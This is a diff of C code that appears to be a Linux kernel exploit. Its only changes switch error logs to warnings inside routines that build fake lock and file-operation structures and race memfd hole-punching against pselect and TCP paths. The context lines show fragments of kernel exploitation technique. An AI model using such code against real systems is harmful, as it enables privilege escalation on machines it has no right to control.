@@ -130,7 +130,7 @@ void do_tcp_fake_lock_route(void) {
   if (!page_base || !fake_lock || !fake_fops) {
     route_last_step = 40;
     route_last_errno = 0;
-    pr_error("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
+    pr_warning("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
              page_base, fake_lock, fake_fops);
     return;
   }
@@ -146,7 +146,7 @@ void do_tcp_fake_lock_route(void) {
   if (tcp_make_pair(&client_fd, &server_fd) != 0) {
     route_last_step = 41;
     route_last_errno = errno;
-    pr_error("tcp route pair setup failed errno=%d\n", errno);
+    pr_warning("tcp route pair setup failed errno=%d\n", errno);
     return;
   }
 
@@ -156,7 +156,7 @@ void do_tcp_fake_lock_route(void) {
       fallocate(punch_fd, 0, 0, TCP_PUNCH_SHMEM_LEN) != 0) {
     route_last_step = 42;
     route_last_errno = errno;
-    pr_error("tcp route memfd/fallocate errno=%d\n", errno);
+    pr_warning("tcp route memfd/fallocate errno=%d\n", errno);
     goto out;
   }
   map = mmap(NULL, TCP_PUNCH_SHMEM_LEN, PROT_READ | PROT_WRITE,
@@ -164,7 +164,7 @@ void do_tcp_fake_lock_route(void) {
   if (map == MAP_FAILED) {
     route_last_step = 43;
     route_last_errno = errno;
-    pr_error("tcp route mmap errno=%d\n", errno);
+    pr_warning("tcp route mmap errno=%d\n", errno);
     goto out;
   }
   for (size_t off = 0; off < TCP_PUNCH_SHMEM_LEN; off += page_size) {
@@ -183,7 +183,7 @@ void do_tcp_fake_lock_route(void) {
   if (pthread_create(&puncher, NULL, tcp_punch_thread, &state) != 0) {
     route_last_step = 44;
     route_last_errno = errno;
-    pr_error("tcp route punch thread errno=%d\n", errno);
+    pr_warning("tcp route punch thread errno=%d\n", errno);
     goto out;
   }
   puncher_started = 1;
@@ -221,7 +221,7 @@ void do_tcp_fake_lock_route(void) {
     if (atomic_load(&tcp_punch_failed)) {
       route_last_step = 46;
       route_last_errno = atomic_load(&tcp_punch_failed);
-      pr_error("tcp route puncher failed errno=%d\n", route_last_errno);
+      pr_warning("tcp route puncher failed errno=%d\n", route_last_errno);
       break;
     }
 
@@ -496,7 +496,7 @@ void do_pselect_fake_lock_route(void) {
   if (!page_base || !fake_lock || !fake_fops) {
     route_last_step = 30;
     route_last_errno = 0;
-    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
+    pr_warning("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
              page_base, fake_lock, fake_fops);
     return;
   }
@@ -525,7 +525,7 @@ void do_pselect_fake_lock_route(void) {
       if (!page_base || !fake_lock || !fake_fops) {
         route_last_step = 35;
         route_last_errno = errno;
-        pr_error("pselect retry page prepare failed attempt=%d\n", attempt);
+        pr_warning("pselect retry page prepare failed attempt=%d\n", attempt);
         break;
       }
     }
@@ -542,7 +542,7 @@ void do_pselect_fake_lock_route(void) {
     if (high_read < 0) {
       route_last_step = 31;
       route_last_errno = errno;
-      pr_error("pselect F_DUPFD read errno=%d\n", errno);
+      pr_warning("pselect F_DUPFD read errno=%d\n", errno);
       if (block_fd != pipefd[0]) {
         close(block_fd);
       }
@@ -640,7 +640,7 @@ void do_pselect_fake_lock_route(void) {
       /* stuck in sched_setattr or futex, closing would reclaim objects its
        * syscall still uses, leak and let process exit reclaim them */
       route_last_step = 34;
-      pr_error("pselect consumer still inflight, leaking route fds\n");
+      pr_warning("pselect consumer still inflight, leaking route fds\n");
       leak_fds = 1;
       break;
     }
